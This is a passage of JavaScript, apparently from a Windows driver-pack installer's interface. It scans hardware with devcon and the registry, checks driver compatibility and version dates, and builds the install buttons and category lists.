	document.getElementById('no_driver_div').style.display = a2;
	document.getElementById('driver_new_div').style.display = a3;
	document.getElementById('driver_uptodate_div').style.display = a4;
	document.getElementById('driver_old_div').style.display = a5;
	document.getElementById('driver_unknown_div').style.display = a6;
	document.getElementById('driver_standard_div').style.display = a7;
	document.getElementById('driverpacks_div').style.display = a8;

	document.getElementById('driver_available_list').style.display = b1;
	document.getElementById('no_driver_list').style.display = b2;
	document.getElementById('driver_new_list').style.display = b3;
	document.getElementById('driver_uptodate_list').style.display = b4;
	document.getElementById('driver_old_list').style.display = b5;
	document.getElementById('driver_unknown_list').style.display = b6;
	document.getElementById('driver_standard_list').style.display = b7;
	document.getElementById('driverpacks_list').style.display = b8;

	dropddownbutton_Out('driver_available_img','driver_available_div');
	dropddownbutton_Out('no_driver_img',       'no_driver_div');
	dropddownbutton_Out('driver_new_img',      'driver_new_div');
	dropddownbutton_Out('driver_uptodate_img', 'driver_uptodate_div');
	dropddownbutton_Out('driver_old_img',      'driver_old_div');
	dropddownbutton_Out('driver_unknown_img',  'driver_unknown_div');
	dropddownbutton_Out('driver_standard_img', 'driver_standard_div');
	dropddownbutton_Out('driverpacks_img',     'driverpacks_div');
}

function hideDetails(mode){
	mode = (mode?"none":"block");
	document.getElementById('button_chkAll').style.visibility=(mode=="none"?"hidden":"visible");
	document.getElementById('button_instAll').style.visibility=(mode=="none"?"hidden":"visible");
	document.getElementById('drv_lists').style.display=mode;
	
	//document.getElementById('hideDetail').checked=(mode=="none"?"checked":"");
	//document.getElementById('hideDetail').blur();
}

// "Expert mode" checkbox
function toggle_expert_mode(mode){
	lf('toggle_expert_mode');
	if(mode=="undefined")mode=true;
	saveParam('expertMode',mode);

	hideDetails(!mode);
	hideOrShow('tab-advanced',!mode);
	hideOrShow('chk_DrvUpdater',hidebloatware);
	hideOrShow('chk_OEMInstall',hidebloatware);
	hideOrShow('chk_DrvUpdater1',hidebloatware);
	hideOrShow('chk_OEMInstall1',hidebloatware);
	hideOrShow('bloat',hidebloatware);
}

function toggle_settings_mode(mode){
	lf('toggle_settings_mode');

	hideOrShow('advanced',!mode);
	hideOrShow('logo',mode);
}


var need_reboot;
// "Run" Button
function run_button(ask, callback) {
	lf('run_button');
	if (instRunCount != 0) 
	{
		//alert(alert_waitInstall); 
		callback && callback();
		return; 
	}
	instRunCount = GetChkCount();
	if (instRunCount == 0)
	{
		alert(alert_notSelected); 
		callback && callback();
		return; 
	}
	need_reboot=false;

	var button_action = [];
	var best_ver = [];
	var duplicates = [];
	var hasDuplicates=false;
	var message = alert_askInstall;

	for (var i = 0; i < buttonCount; i++) {
		var checkbox = document.getElementById('chk'+i);
		if (checkbox.checked) {
			if (instType_all==5) {
				if (button_div[i] != "driverpacks")
					{
						alert(alert_notDriverpack); instRunCount = 0; 
						callback && callback();
						return; 
					}
			}
			if (instType_all==1 && !forceInstall) {
				if (button_div[i] == "driver_uptodate")
					{
						alert(alert_noForcedCurrent); instRunCount = 0; 
						callback && callback();
						return; 
					}
				if (button_div[i] == "driver_old")
					{
						alert(alert_noForcedOld); instRunCount = 0; 
						callback && callback();
						return; 
					}
			}
			if (instType_all==1) {
				if (button_div[i] == "driver_uptodate") message = alert_askInstallCurrent;
				if (button_div[i] == "driver_old") message = alert_askInstallOld;
				if (button_div[i] == "driverpacks") message = alert_askPreinstall;
			}
			else message = alert_askIndex;

			if (!best_ver[button_dev_id[i]])
			{
				best_ver[button_dev_id[i]] = i; 
			}
			else
			{
				hasDuplicates=true;
				// Filling in duplicates list
				if(!duplicates[button_dev_id[i]])
				{
					duplicates[button_dev_id[i]]=[best_ver[button_dev_id[i]],i];
				}
				else
				{
					duplicates[button_dev_id[i]].push(i);
				}
			
			
				if (isNewerThan(button_dev_ver[i],button_dev_ver[best_ver[button_dev_id[i]]]) > 0)
				{
					best_ver[button_dev_id[i]] = i;
				}				
			}
		}
		button_action[i] = checkbox.checked?1:0;
	}
	
	// Showing warning message if duplicates are found
	// We'll show message only if we have callback defined (i.e. function is properly used and we can use modal dialog)
	if(typeof(callback)!="undefined" && instType_all!=5 && hasDuplicates)
	{
		var strWarning = alert_duplicateDrivers1+"<br>";
		for(var z in duplicates)
		{
			strWarning+=z+"<br><ul>";
			var bestVerIndex = typeof(best_ver[z])!="undefined" ? best_ver[z] : -1;
			for(var dup in duplicates[z])
			{
				var drvIndex = duplicates[z][dup];
				strWarning+= "<li>"+button_pack_name[drvIndex] + " ("+button_dev_ver[drvIndex]+")"+
					(bestVerIndex==drvIndex ? "["+alert_bestDriver+"]" : "") + "</li>";
			}
			strWarning+="</ul>";
		}
		strWarning += "<br>"+alert_duplicateDrivers2;
		showModal(alert_duplicateDriverPacksHeader,strWarning,button_continue,button_cancel,function(result)
		{
			if(result)
			{
				continue_run_button(ask,button_action,best_ver,duplicates,message,callback);
			}
			else
			{
				//noRefresh=true;
				instRunCount = 0; 
				callback && callback();
				return;			
			}
		});	
		return;
	}
	
	continue_run_button(ask,button_action,best_ver,duplicates,message,callback);
}

function continue_run_button(ask,button_action,best_ver,duplicates,message,callback) {
	if (ask && !confirm(message)) 
	{ 
		instRunCount = 0;
		callback && callback();
		return; 
	}
	
	//DEBUG!!!
//	alert("Run");
//	instRunCount = 0;
//	callback && callback();
//	return;

	infobar_runInstall((instType_all == 5?infobar_titleIndexing:infobar_DrvInst),GetChkCount());

	startInst = true;
	if (silentInstall) {
		for (var i = 0; i < buttonCount; i++)
			document.getElementById('chk'+i).disabled = "disabled";
	}

	pack_dirs = [];
	for (var i = 0; i < buttonCount; i++)
		if (button_action[i]) {
				var t = button_pack_folder[i] + button_pack_name[i];
				if (!pack_dirs[t])
					pack_dirs[t] = button_dev_dir[i];
				else {
					if (pack_dirs[t].indexOf(button_dev_dir[i]) != -1)
						button_action[i] = 2;
					if (pack_dirs[t].indexOf(button_dev_dir[i]) == -1)
						pack_dirs[t] += "|" + button_dev_dir[i];
				}
			}


	for (var i = 0; i < buttonCount; i++)
		if (button_action[i])
//      	  if (button_action[i] == 1 || instType_all == 5)
{
				document.getElementById('progressBar_Description').innerHTML='<b>'+button_pack_desc[i]+'</b><br><i>'+button_dev_name[i]+'</i>';
				perform_task(i,instType_all);
				if (progressBar) { prBarNext(i); }
}
/*      	  else {
				log(">>> Skipping this version");
				perform_task(i,6);
				log("<<< Skipping this version");
				log();
			}*/

	startInst = false;
	progressBar = false;
	
	callback && callback();
	
}

var pack_is64,pack_winver;
function checkOSArh(pack_name){
	var platform = '';
	var osVer = '';
	var pack_name_lc = pack_name.toLowerCase();

	if (pack_name_lc.indexOf("x86") != -1 || pack_name_lc.indexOf("x32") != -1) {
		pack_is64 = false;
		if (is64) platform = '32-bit';
	} else
	if (pack_name_lc.indexOf("x64") != -1) {
		pack_is64 = true;
		if (!is64) platform = '64-bit';
	} else pack_is64 = undefined;

	pack_winver = 0;
	if (pack_name_lc.indexOf("wxp") != -1 || pack_name_lc.indexOf("wnt5") != -1) {
		pack_winver = 5;
		if (OSVersion!=5) osVer = ' WinXP';
	} else {
		pack_winver = 6;
		if (OSVersion==5) osVer = ' Vista/7';
	}

	return '';
//        return ' <u>'+platform+osVer+'</u>';
}

// Create driverpack button
var buttonCount;
var button_div = [];
var button_pack_folder = [];
var button_pack_name = [];
var button_pack_desc = [];
var button_pack_icon = [];
var button_dev_dir = [];
var button_dev_inf = [];
var button_dev_name = [];
var button_dev_id = [];
var button_dev_ver = [];
var button_dev_status = [];
var pack_dirs = [];

var doc_innerHTML = [];
var doc_num = [];

var last_pack_folder = '';
var last_pack_name = '';
var last_dev_dir = '';
var last_dev_name = '';

function add_button(div,pack_icon,pack_folder,pack_name,pack_desc,dev_name,dev_hint,dev_id,dev_ver,dev_id_hint,dev_status,dev_dir,dev_inf,is_checked) {
	lf('add_button');
	var disabled;
	var name_title = pack_name;

	if (pack_folder != "" && pack_name != "" && dev_dir != "")

	last_pack_folder = pack_folder;
	last_pack_name = pack_name;
	last_dev_dir = dev_dir;
	last_dev_name = dev_name.replace(/-\ [0-9a-fA-F]{4}/,'');

	button_div[buttonCount] =        div;
	button_pack_folder[buttonCount] =pack_folder;
	button_pack_name[buttonCount] =  pack_name;
	button_pack_desc[buttonCount] =  pack_desc;
	button_pack_icon[buttonCount] = pack_icon;
	button_dev_dir[buttonCount] =    dev_dir;
	button_dev_inf[buttonCount] =    dev_inf;
	button_dev_name[buttonCount] =   dev_name;
	button_dev_id[buttonCount] =     dev_id;
	button_dev_ver[buttonCount] =    dev_ver;
	button_dev_status[buttonCount] = dev_status;

	var but_icon = "";
	if (pack_name != "") {
		if (dev_id_hint)
		but_icon +=
			// "Smart install" icon
			"<a href='javascript:void(0)' class='tooltips' onclick=\"javascript:"+
			"if (startInst == true) { return; }" +
			"instRunCount++;" +
			"pack_dirs=[];pack_dirs[button_pack_folder["+buttonCount+"] + button_pack_name["+buttonCount+"]]=button_dev_dir["+buttonCount+"];" +
			"perform_task(" + buttonCount + ",1);refresh_perform_task();" +
			"\" title='"+drv_modeSmart+"'>" +

			// "Manual install" icon
			"<img src='tools\\ico\\button\\18.png'></a>" +
			"<a href='javascript:void(0)' class='tooltips' onclick=\"javascript:" +
			"perform_task(" + buttonCount + ",4);refresh_perform_task();" +
			"\" title='"+drv_modeManual+"'>" +
			"<img src='tools\\ico\\button\\19.png'></a> ";
	}
	else {
		name_title = drv_onlyInternet;
		disabled = "disabled";
	}

	// "Search in the web" icon
	if (dev_id_hint)
	but_icon +=
		" <a href='#' class='tooltips' title='"+doubleHTML(drv_findInternet)+"' onclick=\"return goToUrl('http://devid.drp.su/?dev=" +
		escape(dev_id) + "','','');" +
		"\" onmousemove=\"return ttlOver(event, '"+doubleHTML(drv_findInternet)+"')\" onmouseout='return ttlOut()'>" +
		"<img src='tools\\ico\\button\\21.png'></a> ";

	var b = ""; var b2 = "";

	var hint = ""; var hint_desc = "";
/*    if (dev_name.toLowerCase().indexOf('nvidia') != -1) {
		hint = "<img src='tools\\ico\\3.png'> ";
		hint_desc = hint_nvidia;
	}
	else if (pack_name.toLowerCase().indexOf("bluetooth") != -1) {
		hint = "<img src='tools\\ico\\3.png'>";
		hint_desc = hint_bluetooth;
	}*/

	if(is_checked)ChangeChkCount(is_checked?1:-1);
	// Driverpack item and hint		
	buttonContent =
		"<table class='button-table'><tr><td width='70'><input type='hidden' id='packname" +
		buttonCount + "' value='" + pack_name + "'>" +
		"<input type='hidden' id='type" + buttonCount +
		"' value='" + div + "'>" +
		"<input onClick='ChangeChkCount(this.checked?1:-1)' id='chk" + buttonCount +
		"' class='checkbox' type='checkbox' " + disabled + (is_checked?" checked ":"") +
		"><img src='tools\\ico\\button\\" + pack_icon +
		".png' id='Button_" + buttonCount + "'></td> ";


	if (div != 'driver_unknown'&&div != 'no_driver'&&div != 'driver_standard')
		buttonContent += "<td width='151' onmousemove=\"return ttlOver(event, '&nbsp;&nbsp;"+doubleHTML("<b>"+pack_desc+"</b><br>"+name_title)
			+"')\" onmouseout='return ttlOut()'>" + b + pack_desc + (div == 'no_driver'?"":checkOSArh(pack_name)) + b2 + "</td>";

	buttonContent +=
		"<td width='100%'><div class='drv-info-popovers' rel='popover' title='"+dev_name+"' data-content='"+hint_desc+dev_hint+"'>" + hint + dev_name + "</div></td>" +
		//Add data about DevID's to tips    "<td3 onmousemove=\"return ttlOver(event, '"+doubleHTML(dev_id_hint)+"')\" onmouseout='return ttlOut()'>" + getdevtype(dev_id) + "</td>" +
		"<td width='100' align='right'><span class='but_icon'>" + but_icon + "</span></td></tr></table>";
//    log(buttonContent.replace(/</g,"\r\n<"));
		doc_innerHTML[div] += buttonContent;
/*
		if ((pack_desc==synonym_audio) && (dev_name.toLowerCase().indexOf('soundmax') != -1)) { doc_innerHTML[div] = buttonContent + doc_innerHTML[div]; }  //SoundMax Fix
		else { doc_innerHTML[div] += buttonContent; }
*/

	doc_num[div]++;
	buttonCount++;
}

//Return the type of device: PCI/USB/ACPI, etc.
function getdevtype(ID) {
	lf('getdevtype');
	if (ID == "") return "";
	if (ID.indexOf("VEN")  != -1)    return "PCI";
	if (ID.indexOf("VID")  != -1)    return "USB";
	if (ID.indexOf("ACPI") != -1)    return "ACPI";
	if (ID.indexOf("PNP")  != -1)    return "PNP";
	if (ID.indexOf("IDE")  != -1)    return "IDE";
	if (ID.indexOf("USB")  != -1)    return "USB";
	if (ID.indexOf("ROOT") != -1)    return "ROOT";
	if (ID.indexOf("SCSI") != -1)    return "SCSI";
	if (ID.indexOf("STORAGE") != -1) return "STORAGE";
	if (ID.indexOf("MONITOR") != -1) return "MONITOR";
	return "UNK";
}

</script>

<!-- Unpack driverpack -->
<script type="text/javascript">

// DEV_ID data
var HWIDS;
var dev_IDs = [];
var dev_devname = [];
var dev_curstatus = [];
var dev_manuf = [];
var dev_group = [];
var dev_found = [];
var dev_ind = [];
var dev_inst_ind = [];
var dev_hashval = [];
var dev_provider = [];

// Hashtable. "dev_id" is the key
var table_score = [];
var table_dir = [];
var table_inf = [];
var table_arh = [];
var table_cat = [];
var table_ver = [];
var table_desc = [];
var table_instver = [];
var table_instvr = [];
var table_instinf = [];
var table_instsect = [];
var table_key = [];

	// Catches expection when array consist of only one item
	function VB2JSArray(objVBArray){
		lf('VB2JSArray');
		var a;
		try{
			a = new VBArray(objVBArray).toArray();
		}
		catch(e){
			a = new Array(objVBArray);
		}
		return a;
	}

	// Check if date1 newer than date2
	function isNewerThan(date1,date2){
		lf('isNewerThan');
		var re;
		re = new RegExp("(\\d+).(\\d+).(\\d+)");
		var r1=re.exec(date1);
		var m1 = +RegExp.$1, d1 = +RegExp.$2, y1 = +RegExp.$3;
		re = new RegExp("(\\d+).(\\d+).(\\d+)");
		var r2=re.exec(date2);
		var m2 = +RegExp.$1, d2 = +RegExp.$2, y2 = +RegExp.$3;
		if(!r1) log("**1 Bad date1 = "+date1);
		if(!r2) log("**2 Bad date2 = "+date2);

		if (!r1 || !r2) return 1;
		if (y1-y2 != 0) return y1-y2;
		if (m1-m2 != 0) return m1-m2;
		if (d1-d2 != 0) return d1-d2;
		return 0;
	}

	// Check for architecture and OS version compatibility
	// 0 Incompatible (determined by section)
	// 1 Incompatible (determined by dir)
	// 2 Possibly incompatible (determined by driverpack name)
	// 3 Possibly compatible (determined by driverpack name)
	// 4 Compatible (determined by dir)
	// 5 Compatible (determined by section)  ^^
	function isCompatible(sect,inffile){
		var re = new RegExp("\\.NT(X86|AMD64|IA64|)(?:\\.(\\d(?:.\\d)))?");
		var arch,ver,ret,lastret = null;

//OSVersion=6.1;
//is64=1;
		var arch_match=9;
		var ver_match=9;
		var r=re.exec(sect.toUpperCase());
		if(!r||inffile.toUpperCase().indexOf("FORCED") != -1)
		{
			arch = null;
			ver = null;
		}else
		{
			arch = RegExp.$1;
			ver = RegExp.$2;
		}

		if(!ver||ver=="")
		{
			var str;
			switch(OSVersion)
			{
				case 5.0:
				case 5.1:
				case 5.2:str=is64?ver_51x64:ver_51x86;break;
				case 6.0:str=is64?ver_60x64:ver_60x86;break;
				case 6.1:str=is64?ver_61x64:ver_61x86;break;
				case 6.2:str=is64?ver_62x64:ver_62x86;break;
				case 6.3:str=is64?ver_63x64:ver_63x86;break;
			}
			str+="|"+(is64?ver_XXx64:ver_XXx86)+"|"+ver_XXxXX;
			var re = new RegExp(str.toUpperCase());
			if (re.exec(inffile.toUpperCase())&&!ignore_markers)
			{
				ver_match=4;
			}else
			{
				var re = new RegExp(ver_known_ver.toUpperCase());
				if (re.exec(inffile.toUpperCase())&&!ignore_markers)
					ver_match=1;
				else
				{
					switch(OSVersion)
					{
						case 5.0:
						case 5.1:
						case 5.2:ver_match=pack_winver==5||!pack_winver?3:2;break;
						case 6.0:
						case 6.1:
						case 6.2:
						case 6.3:ver_match=pack_winver==6||!pack_winver?3:2;break;
					}
				}
			}
		}
		else
		{
			if(ver==OSVersion)
				ver_match=5;
			else
			if(inffile.toUpperCase().indexOf(ver_strict)== -1 )
				ver_match=(Math.round(OSVersion)==Math.round(ver)&&OSVersion>ver)?3:0;
			else
				ver_match=(OSVersion==ver)?3:0;

//      	  ver_match=ver==OSVersion?5:0;
		}

		if (!arch||arch=="")
		{
			var re = new RegExp((is64?ver_Any64:ver_Any86).toUpperCase());
			if (re.exec(inffile.toUpperCase())&&!ignore_markers)
			{
				arch_match=4;
			}else
			{
				var re = new RegExp((is64?ver_Any86:ver_Any64).toUpperCase());
				if (re.exec(inffile.toUpperCase())&&!ignore_markers)
					arch_match=1;
				else
				{
					arch_match=is64==pack_is64||!pack_is64?3:2;
				}
			}
		}
		else
			arch_match=(arch=="AMD64"&&is64)||(arch=="X86"&&!is64)?5:0;

		//log("@ a"+arch_match+" v"+ver_match+" ["+ver+","+arch+","+inffile+"]"+sect);
		//log("$ v"+ver_match+" a"+arch_match+" ["+ver+","+arch+","+inffile+"]");
		return ver_match<arch_match?ver_match:arch_match;
	}

	// get_hash_value
	function get_hash_value(obj){
		lf('get_hash_value');
		hashval = 0;
		for (j=0;j<obj.length;j++){
			chr = obj.charCodeAt(j);
			hashval = ((hashval*32+hashval)&0xffffff)^chr;
		}
		return hashval;
	}

	// Scan hardware
	function scan_hardware() {
		lf('scan_hardware');
		// Inquiry hardware information
		WshShell.Run("cmd /C mkdir \"%TEMP%\\drp\" & tools\\"+devcon+" status * > \"%TEMP%\\drp\\HWIDS.txt\"",0,true);
		try {
			var tempfile;// ^^
			tempfile = fso.OpenTextFile(temp + '\\drp\\HWIDS.txt', 1, false);
//      		  tempfile = fso.OpenTextFile('HWIDS.txt', 1, false);
			HWIDS = tempfile.ReadAll();
			tempfile.Close();
		}
		catch(e) {
			log("Failed to read HWIDS.txt");
			alert(alert_notReadHWID);
			return;
		}
		try { if (!disableCurDir){ fso.CopyFile(temp + '\\drp\\HWIDS.txt', logFolder+'\\HWIDS'+logNameEnding+'.txt'); } }
		catch(e) { log("Failed to copy " + temp + '\\drp\\HWIDS.txt to '+logFolder+'\\HWIDS'+logNameEnding+'.txt'); }
		HWIDS = HWIDS.toUpperCase();

		// Parse hardware information
		var re = new RegExp("(^[^\\n\\r\\s][^\\n\\r]+)\\r\\n(\\s+[^\\n\\r]+\\r\\n)*[^\\n\\r]*" +
			"((?:DEVICE IS|DEVICE HAS|DRIVER IS|DRIVER HAS)[^\\r]+)","mg");

		var l = 0;
		var groupn = 0;
		var IDlist = [];
		var matches = 0;
		dev_IDs = [];
		dev_devname = [];
		dev_curstatus = [];
		dev_manuf = [];
		dev_group = [];
		dev_found = [];
		dev_ind = [];
		dev_inst_ind = [];
		dev_hashval = [];
		dev_provider = [];

		table_instver = [];
		table_instvr = [];
		table_instinf = [];
		table_instsect = [];
		table_key = [];
		timer_new("Timer_Loaded_hardware ");
		while (result = re.exec(HWIDS)) {
			log("DeviceInfo");
			var reg_1 = RegExp.$1;
			var reg_3 = RegExp.$3;
			matches++;
			if (IDlist[reg_1] == null) {
				var enump = "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\"+reg_1+"\\";
				var devname = RegRead(enump + "DeviceDesc");
				devname = devname.replace(/@[^;]+;/,"");
				log("##Name:#########"+devname);
				log("##Status:#######"+reg_3);
				var manuf = RegRead(enump + "Mfg");
				log("##Manufacturer:#"+manuf);
				log("##HWID_reg######"+reg_1);
				var tmp = RegRead(enump + "Class");
				log("##Class:########"+tmp);
				var tmp = RegRead(enump + "LocationInformation");
				log("##Location:#####"+tmp);
				var tmp = RegRead(enump + "ConfigFlags");
				log("##ConfigFlags:##"+tmp);
				var tmp = RegRead(enump + "Capabilities");
				log("##Capabilities:#"+tmp);
				var drvver;

				log("DriverInfo");
				var pos = RegRead(enump + "Driver");
				var dev_id = null;
				var provider="";
				if (pos=="")log("NoDriver");else
				{
					pos = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\"+pos+"\\";
					var tmp = RegRead(pos + "DriverDesc");
					log("##Name:#####"+tmp);
					provider = RegRead(pos + "ProviderName");
					log("##Provider:#"+provider);
					var ver = RegRead(pos + "DriverDate");
					dev_id = RegRead(pos + "MatchingDeviceId");
					drvver = RegRead(pos + "DriverVersion");
					log("##Date:#####"+ver);
					log("##Version:##"+drvver);
					dev_id = dev_id.toUpperCase();
					log("##HWID:#####"+dev_id);
					var tmp1 = RegRead(pos + "InfPath");
					var tmp2 = RegRead(pos + "InfSection");
					var tmp3 = RegRead(pos + "InfSectionExt");
					log("##inf:######"+tmp1+","+tmp2+tmp3);
					table_instinf[dev_id] = tmp1;
					table_instsect[dev_id] = tmp2 + tmp3;
					table_instver[dev_id] = ver;
					table_instvr[dev_id] = drvver;
				}

				var ind = 0;
				var strind = l;
				var nd_ind = null;
				var dup=0;
				var pos = RegRead(enump + "HardwareID");
				if (pos != ""){
					arr=VB2JSArray(pos);
					log("HardwareID");
					for(i in arr){
						dev_IDs[l] = arr[i].toUpperCase();
						dup=table_key[dev_IDs[l]];
						log("##" + (dup?"[dup]":"") + dev_IDs[l]);
						table_key[dev_IDs[l]]=1;
						dev_devname[l] = devname;
						dev_curstatus[l] = reg_3;
						dev_manuf[l] = manuf;
						dev_group[l] = groupn;
						dev_ind[l] = ind;
						dev_provider[l] = provider;
						if (dev_IDs[l]==dev_id)nd_ind = ind;
						dev_hashval[l] = get_hash_value(dev_IDs[l]);
						var thisID = dev_IDs[l];
						if (!dev_id) dev_id = thisID.toUpperCase();
						table_instinf[thisID] = table_instinf[dev_id];
						table_instsect[thisID] = table_instsect[dev_id];
						table_instver[thisID] = table_instver[dev_id];
						table_instvr[dev_id] = drvver;
						if(!dup)
						{
							l++;ind++;
						}
					}
				}else log("NoID");

				var pos = RegRead(enump + "CompatibleIDs");
				if (pos != "")
				{
					arr=VB2JSArray(pos);
					log("CompatibleID");
					for(i in arr){
						dev_IDs[l] = arr[i].toUpperCase();
						dup=table_key[dev_IDs[l]];
						log("##" + (dup?"[dup]":"") + dev_IDs[l]);
						table_key[dev_IDs[l]]=1;
						dev_devname[l] = devname;
						dev_curstatus[l] = reg_3;
						dev_manuf[l] = manuf;
						dev_group[l] = groupn;
						dev_ind[l] = ind;
						if (dev_IDs[l]==dev_id)nd_ind = ind;
						dev_hashval[l] = get_hash_value(dev_IDs[l]);
						var thisID = dev_IDs[l];
						table_instinf[thisID] = table_instinf[dev_id];
						table_instsect[thisID] = table_instsect[dev_id];
						table_instver[thisID] = table_instver[dev_id];
						table_instvr[dev_id] = drvver;
						if(!dup)
						{
							l++;ind++;
						}
					}
				}
				var j=strind;
				if(nd_ind!=null)
					for(;j<l;j++)dev_inst_ind[j] = nd_ind;
				groupn++;
				IDlist[reg_1] = 1;
				log();log();
			}
		}
		var re = new RegExp("(\\d+) MATCHING DEVICE\\(S\\) FOUND.","mg");
		re.exec(HWIDS)
		var numHWIDS = RegExp.$1;
		if (parseInt(numHWIDS) != matches) {
			log(HWIDS);
			log(matches);
			alert(manual_alert_error);
		}
		log("Found devices: "+dev_IDs.length);
	}

	var hashdata
	// get_val_i
	function get_val_i(i){
		return parseInt("0x"+hashdata.substr(8*i,8));
	}

	function infobar_urlsClean(devid){
		if ((!devid) || (devid=='undefined')) { return drv_notKnown; }
		else if (devid.length>21) { return devid.substr(0,21)+'...'; }
		else { return devid; }

		/*
		if (devid.toLowerCase().indexOf('pci')!=-1) {
			return devid.substr(0,devid.toLowerCase().indexOf('dev_')+8);
		}
		else if (devid.toLowerCase().indexOf('usb')!=-1) {
			return devid.substr(0,devid.toLowerCase().indexOf('pid_')+8);
		}
		else {
			return devid.substr(0,devid.toLowerCase().indexOf('pid_')+8);
		}
		*/
	}

	var total_bytes_read;
	// Scan indexes
	function load_indexes(pack_folder,pack_name) {
		lf('load_indexes');
		// Strip filename and replace with synonym
		pack_name = pack_name.replace(/.7z/i,"");
		pack_desc = pack_name.replace(/DP_/i,"");
		pack_desc = pack_desc.replace(/_wnt5[\S_-]+/i,"");
		pack_desc = pack_desc.replace(/_x86[\S_-]+/i,"");
		pack_desc = pack_desc.replace(/_/gi," ");
		pack_desc = pack_desc.replace(/[-#]/i,"");

		pack_icon = "0";
		var pack_name_lc = pack_name.toLowerCase();
		if (useAliases) {
		   if (pack_name_lc.indexOf("audio") != -1) { pack_desc = synonym_audio; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("biometric") != -1) { pack_desc = synonym_biometric; pack_icon = "11"; }
		   else if (pack_name_lc.indexOf("input") != -1) { pack_desc = synonym_hid; pack_icon = "11"; }
		   else if (pack_name_lc.indexOf("bluetooth") != -1) { pack_desc = synonym_bluetooth; pack_icon = "5"; }
		   else if (pack_name_lc.indexOf("cardreader") != -1) { pack_desc = synonym_cardreaders; pack_icon = "14"; }
		   else if (pack_name_lc.indexOf("smartcard") != -1) { pack_desc = synonym_cardreaders; pack_icon = "14"; }
		   else if (pack_name_lc.indexOf("chipset") != -1) { pack_desc = synonym_chipset; pack_icon = "2"; }
		   else if (pack_name_lc.indexOf("filter") != -1) { pack_desc = synonym_chipset; pack_icon = "2"; }
		   else if (pack_name_lc.indexOf("cpu") != -1) { pack_desc = synonym_cpu; pack_icon = "2"; }
		   else if (pack_name_lc.indexOf("wlan") != -1) { pack_desc = synonym_wlan; pack_icon = "13"; }
		   else if (pack_name_lc.indexOf("massstorage") != -1) { pack_desc = synonym_masstorage; pack_icon = "4"; }
		   else if (pack_name_lc.indexOf("masstorage") != -1) { pack_desc = synonym_masstorage; pack_icon = "4"; }
		   else if (pack_name_lc.indexOf("misc") != -1) { pack_desc = synonym_misc; pack_icon = "1"; }
		   else if (pack_name_lc.indexOf("gaming") != -1) { pack_desc = synonym_misc; pack_icon = "1"; }
		   else if (pack_name_lc.indexOf("hid") != -1) { pack_desc = synonym_hid; pack_icon = "11"; }
		   else if (pack_name_lc.indexOf("modem") != -1) { pack_desc = synonym_modem; pack_icon = "6"; }
		   else if (pack_name_lc.indexOf("broadband") != -1) { pack_desc = synonym_broadband; pack_icon = "6"; }
		   else if (pack_name_lc.indexOf("monitor") != -1) { pack_desc = synonym_monitor; pack_icon = "15"; }
		   else if (pack_name_lc.indexOf("notebook") != -1) { pack_desc = synonym_notebook; pack_icon = "23"; }
		   else if (pack_name_lc.indexOf("printer") != -1) { pack_desc = synonym_printer; pack_icon = "16"; }
		   else if (pack_name_lc.indexOf("scanner") != -1) { pack_desc = synonym_scanner; pack_icon = "17"; }
		   else if (pack_name_lc.indexOf("sound_adi") != -1) { pack_desc = synonym_sound_adi; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound_cmedia") != -1) { pack_desc = synonym_sound_cmedia; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound_conexant") != -1) { pack_desc = synonym_sound_conexant; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound_creative") != -1) { pack_desc = synonym_sound_creative; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound_idt") != -1) { pack_desc = synonym_sound_idt; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound_via") != -1) { pack_desc = synonym_sound_via; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sounds_realtek") != -1) { pack_desc = synonym_sounds_realtek; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sounds_hdmi") != -1) { pack_desc = synonym_sounds_hdmi; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("sound") != -1) { pack_desc = synonym_audio; pack_icon = "8"; }
		   else if (pack_name_lc.indexOf("phone") != -1) { pack_desc = synonym_phone; pack_icon = "22"; }
		   else if (pack_name_lc.indexOf("touchpad_alps") != -1) { pack_desc = synonym_touchpad_alps; pack_icon = "20"; }
		   else if (pack_name_lc.indexOf("touchpad_cypress") != -1) { pack_desc = synonym_touchpad_cypress; pack_icon = "20"; }
		   else if (pack_name_lc.indexOf("touchpad_elan") != -1) { pack_desc = synonym_touchpad_elan; pack_icon = "20"; }
		   else if (pack_name_lc.indexOf("touchpad_synaptics") != -1) { pack_desc = synonym_touchpad_synaptics; pack_icon = "20"; }
		   else if (pack_name_lc.indexOf("touchpad") != -1) { pack_desc = synonym_touchpad; pack_icon = "20"; }
		   else if (pack_name_lc.indexOf("tv_aver") != -1) { pack_desc = synonym_tv_aver; pack_icon = "15"; }
		   else if (pack_name_lc.indexOf("tv_beholder") != -1) { pack_desc = synonym_tv_beholder; pack_icon = "15"; }
		   else if (pack_name_lc.indexOf("tv_dvb") != -1) { pack_desc = synonym_tv_dvb; pack_icon = "15"; }
		   else if (pack_name_lc.indexOf("_tv") != -1) { pack_desc = synonym_tv; pack_icon = "15"; }
		   else if (pack_name_lc.indexOf("vendor") != -1) { pack_desc = synonym_vendor; pack_icon = "23"; }
		   else if (pack_name_lc.indexOf("video_amd") != -1) { pack_desc = synonym_video_amd; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("video_intel") != -1) { pack_desc = synonym_video_intel; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("video_nvidia") != -1) { pack_desc = synonym_video_nvidia; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("video_server") != -1) { pack_desc = synonym_video_server; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("video") != -1) { pack_desc = synonym_graphics; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("graphics") != -1) { pack_desc = synonym_graphics; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("runtimes") != -1) { pack_desc = synonym_graphics; pack_icon = "12"; }
		   else if (pack_name_lc.indexOf("webcam") != -1) { pack_desc = synonym_webcam; pack_icon = "7"; }
		   else if (pack_name_lc.indexOf("usb") != -1) { pack_desc = synonym_usb; pack_icon = "10"; }
		   else if (pack_name_lc.indexOf("lan_intel") != -1) { pack_desc = synonym_lan_intel; pack_icon = "9"; }
